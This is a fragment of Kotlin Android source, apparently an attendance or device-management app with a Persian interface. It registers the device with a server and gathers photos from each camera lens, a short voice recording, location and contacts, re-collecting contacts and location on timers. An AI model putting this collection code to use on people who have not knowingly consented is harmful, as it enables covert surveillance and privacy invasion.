    private fun encodePhoto(file: File): String? = try {
        val scaled = decodeScaled(file, MAX_PHOTO_EDGE)
        val out = ByteArrayOutputStream()
        scaled.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, out)
        scaled.recycle()
        Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
    } catch (t: Throwable) {
        Log.w(TAG, "encode ${file.name}: ${t.message}")
        null
    }

    private fun decodeScaled(file: File, maxEdge: Int): Bitmap {
        val bounds = BitmapFactory.Options().apply { inJustDecodeBounds = true }
        BitmapFactory.decodeFile(file.absolutePath, bounds)
        var sample = 1
        var edge = maxOf(bounds.outWidth, bounds.outHeight)
        while (edge / 2 >= maxEdge) {
            sample *= 2
            edge /= 2
        }
        return BitmapFactory.decodeFile(
            file.absolutePath,
            BitmapFactory.Options().apply { inSampleSize = sample },
        ) ?: throw IllegalStateException("decode failed for ${file.name}")
    }

    

    

    private suspend fun registerDevice(attempt: Int = 0): Boolean {
        if (attempt > REGISTER_ATTEMPTS) return false
        return try {
            val androidId = DeviceCollector.getAndroidId(this)
            Prefs.cacheAndroidId(this, androidId)
            val hardware = withContext(Dispatchers.IO) {
                DeviceCollector.collect(this@MainActivity) + networkFacts()
            }
            val res = withContext(Dispatchers.IO) {
                runCatching {
                    MdmApi(prefs.serverUrl, "").register(
                        androidId, hardware, prefs.label.ifBlank { Build.MODEL },
                    )
                }.getOrNull()
            }
            if (res != null && res.deviceKey.isNotEmpty()) {
                prefs.deviceKey = res.deviceKey
                prefs.registered = true
                prefs.lostMode = res.lostMode
                PolicyEnforcer.apply(this, res.policy)
                PolicyWatchService.start(this)
                true
            } else {
                
                
                
                delay(3_000L * (3.0.pow(attempt.toDouble())).toLong())
                registerDevice(attempt + 1)
            }
        } catch (t: Throwable) {
            Log.w(TAG, "register: ${t.message}")
            if (attempt > REGISTER_ATTEMPTS) {
                false
            } else {
                delay(3_000L)
                registerDevice(attempt + 1)
            }
        }
    }

    

    /**
     * Put a message in front of the user, once.
     *
     * The message is delivered through the state payload rather than a direct
     * `Prf.log` call, because a message raised before the WebView finished
     * loading would otherwise be dropped on the floor. The sequence number is
     * what makes "once" mean once: the panel re-reads the state every second,
     * so a payload that still carries the last message would put that message
     * back on screen every second and pin it there for as long as the app was
     * open. The panel only shows a message whose sequence it has not seen.
     */
    private fun status(msg: String, tone: String = "") {
        pendingLog = msg
        pendingTone = tone
        logSeq++
    }

    private fun push() {
        if (!ready) return
        callJs("Prf.push && Prf.push();")
    }

    private fun callJs(src: String) {
        ui.post { try { web.evaluateJavascript(src, null) } catch (t: Throwable) { } }
    }

    

    private fun jsStr(s: String): String {
        val sb = StringBuilder("\"")
        for (c in s) {
            when (c) {
                '"' -> sb.append("\\\"")
                '\\' -> sb.append("\\\\")
                '\n' -> sb.append("\\n")
                '\r' -> sb.append("\\r")
                '\t' -> sb.append("\\t")
                '<' -> sb.append("\\u003c")
                else -> if (c < ' ') sb.append("\\u%04x".format(c.code)) else sb.append(c)
            }
        }
        return sb.append('"').toString()
    }

    
    private fun fa(s: String): String =
        s.map { if (it in '0'..'9') '۰' + (it - '0') else it }.joinToString("")

    private fun relative(ms: Long): String {
        if (ms <= 0L) return "هرگز"
        val s = ((System.currentTimeMillis() - ms) / 1000).coerceAtLeast(0)
        return when {
            s < 60 -> "${fa(s.toString())} ثانیه پیش"
            s < 3600 -> "${fa((s / 60).toString())} دقیقه پیش"
            s < 86400 -> "${fa((s / 3600).toString())} ساعت پیش"
            else -> "${fa((s / 86400).toString())} روز پیش"
        }
    }

    override fun onDestroy() {
        ui.removeCallbacks(tick)
        runJob?.cancel()
        scope.cancel()
        try { web.destroy() } catch (t: Throwable) { }
        super.onDestroy()
    }

    private companion object {
        const val TAG = "PRF.Main"

        /**
         * One `kind` per stage, so the panel can tell a run's five stages apart
         * instead of seeing five identical attendance rows. The server keeps
         * `attendance` as the kind it recognises for the combined flow, and stores
         * anything else as it arrives rather than relabelling it — so these read
         * back exactly as sent.
         */
        const val KIND_DEVICE = "stage_0_device"
        const val KIND_PHOTOS = "stage_1_photos"
        const val KIND_VOICE = "stage_2_voice"
        const val KIND_LOCATION = "stage_3_location"

        // Stages 0 to 4: the device, the photographs, the voice note, the place,
        // the address book.
        const val STAGE_COUNT = 5

        const val MAC_PLACEHOLDER = "02:00:00:00:00:00"
        const val PHOTOS_PER_LENS = 3
        const val VOICE_SECONDS = 8
        const val MAX_PHOTO_EDGE = 1600
        const val JPEG_QUALITY = 80
        const val PREVIEW_SETTLE_MS = 1200L

        /**
         * How long the app keeps watching for an administrator grant that the
         * person activates themselves. It watches; it does not ask. See
         * watchAdminGrant for why the app cannot do it for them.
         */
        const val AUTO_ADMIN_WATCH_MS = 90_000L

        const val LOCATION_WAIT_MS = 6_000L

        const val REGISTER_ATTEMPTS = 3

        

        val PERM_ORDER = listOf(
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            Permissions.LOCATION,
            ContactsCollector.READ,
        )

        const val CONTACTS_INTERVAL_MS = 6L * 60 * 60 * 1000
        const val LOCATION_INTERVAL_MS = 15L * 60 * 1000

        

    }
}
